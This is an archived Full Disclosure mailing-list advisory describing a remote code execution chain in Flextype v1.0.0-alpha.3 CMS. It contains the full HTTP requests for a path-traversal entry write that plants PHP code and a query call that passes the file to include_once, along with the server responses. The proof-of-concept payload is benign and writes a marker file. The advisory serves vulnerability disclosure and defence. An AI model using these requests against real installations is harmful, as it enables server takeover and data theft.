---
title: Flextype v1.0.0-alpha.3 CMS registerShortcodes() Remote Code Execution via Attacker-Controlled File Inclusion
url: https://seclists.org/fulldisclosure/2026/Sep/27
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:31.710854
---

# Flextype v1.0.0-alpha.3 CMS registerShortcodes() Remote Code Execution via Attacker-Controlled File Inclusion

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](26)
[By Date](date.html#27)
[![Next](/images/right-icon-16x16.png)](28)

[![Previous](/images/left-icon-16x16.png)](26)
[By Thread](index.html#27)
[![Next](/images/right-icon-16x16.png)](28)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 CMS registerShortcodes() Remote Code Execution via Attacker-Controlled File Inclusion

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Mon, 31 Aug 2026 08:33:45 -0400

---

```
Description

Flextype CMS contains a remote code execution vulnerability in the
interaction between the Entries API and Shortcodes::registerShortcodes().
The /api/v1/entries endpoint accepts an attacker-controlled entry
identifier that can contain path traversal sequences, allowing content
containing PHP code to be written outside the intended entries directory.

The /api/v1/query endpoint subsequently permits an attacker-controlled path
to reach Shortcodes::registerShortcodes(), where the supplied path is
passed to an include_once operation relative to FLEXTYPE_ROOT_DIR.

An attacker can therefore first use the path traversal condition to place a
PHP-containing file at a predictable location beneath the application root
and then invoke registerShortcodes() with the path to that file. PHP
interprets the included file as executable PHP regardless of the .md
extension, resulting in execution of attacker-controlled code in the
context of the Flextype PHP process.
Impact

A remote attacker with the required API access can execute arbitrary PHP
code with the privileges of the Flextype application process. This may
result in complete compromise of the affected Flextype installation,
including unauthorized access to application data, modification or deletion
of content, disclosure of sensitive configuration or credentials accessible
to the application, installation of persistent malicious code, and further
compromise of resources accessible from the application server.

The demonstrated proof of concept performs only a benign filesystem write
to /tmp/register-shortcodes-rce-proof, confirming arbitrary PHP execution
without performing destructive actions.
Technical DetailsStep 1 — Path Traversal Allows PHP Content to Be Written
Beneath the Application Root

The /api/v1/entries endpoint accepts the attacker-controlled identifier
../../rce-register-shortcodes. The traversal sequence causes the resulting
entry to be written to /app/rce-register-shortcodes/entry.md rather than
remaining within the intended entries storage location.

POST /api/v1/entries HTTP/1.1
Host: 127.0.0.1:18089
Content-Type: application/json

{"token":"lab-token","access_token":"password","id":"../../rce-register-shortcodes","data":{"title":"register
shortcodes rce","content":"<?php
file_put_contents('/tmp/register-shortcodes-rce-proof',
'REGISTER_SHORTCODES_RCE_PROOF'); ?>"}}

The server accepts the traversal identifier and returns a successful
response:

HTTP/1.1 200 OK
Host: 127.0.0.1:18089
Content-Type: application/json;charset=UTF-8
Content-Length: 410
Access-Control-Allow-Origin: *

{"title":"register shortcodes
rce","published_by":"","created_by":"","uuid":"77bce63b-9006-46df-8bbc-48e2182d5b84","content":"<?php
file_put_contents('/tmp/register-shortcodes-rce-proof',
'REGISTER_SHORTCODES_RCE_PROOF');
?>","slug":"rce-register-shortcodes","published_at":1788178537,"modified_at":1788178537,"created_at":1788178537,"routable":true,"visibility":"visible","id":"../../rce-register-shortcodes"}

The resulting file is created at:

/app/rce-register-shortcodes/entry.md

Its contents include the supplied PHP payload:

---
title: 'register shortcodes rce'
published_by: ''
created_by: ''
uuid: 77bce63b-9006-46df-8bbc-48e2182d5b84
---
<?php file_put_contents('/tmp/register-shortcodes-rce-proof',
'REGISTER_SHORTCODES_RCE_PROOF'); ?>

Before the file is included, the proof file does not exist:

marker_exists=no

This confirms that merely writing the entry does not execute the PHP
payload.
Step 2 — Attacker-Controlled Path Reaches registerShortcodes() include_once

The attacker can then invoke parsers().shortcodes().registerShortcodes()
through /api/v1/query and supply the path of the previously created file:

POST /api/v1/query HTTP/1.1
Host: 127.0.0.1:18089
Content-Type: application/json

{"token":"lab-token","access_token":"password","query":{"include":"parsers().shortcodes().registerShortcodes([{enabled:
true, path: 'rce-register-shortcodes/entry.md'}])"}}

The supplied path reaches an include_once operation equivalent to:

include_once FLEXTYPE_ROOT_DIR . '/' . $path;

The server successfully processes the request:

HTTP/1.1 200 OK
Host: 127.0.0.1:18089
Content-Type: application/json;charset=UTF-8
Content-Length: 16
Access-Control-Allow-Origin: *

{"include":null}

Following the registerShortcodes() invocation, the marker file exists:

marker_exists=yes
REGISTER_SHORTCODES_RCE_PROOF

The transition from marker_exists=no before the include_once operation to
marker_exists=yes afterward demonstrates that the PHP contained within
entry.md was interpreted and executed by the PHP runtime.
Exploitation Chain

The demonstrated attack consists of two conditions:

   1. *Path traversal / arbitrary file write:* attacker-controlled PHP
   content is written beneath the Flextype application root using
   /api/v1/entries.
   2. *Attacker-controlled PHP inclusion:* /api/v1/query allows the
   attacker to pass the created file to Shortcodes::registerShortcodes(),
   which reaches include_once.

When chained, these conditions result in remote arbitrary PHP code
execution.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](26)
[By Date](date.html#27)
[![Next](/images/right-icon-16x16.png)](28)

[![Previous](/images/left-icon-16x16.png)](26)
[By Thread](index.html#27)
[![Next](/images/right-icon-16x16.png)](28)

### Current thread:

* **Flextype v1.0.0-alpha.3 CMS registerShortcodes() Remote Code Execution via Attacker-Controlled File Inclusion** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](htt...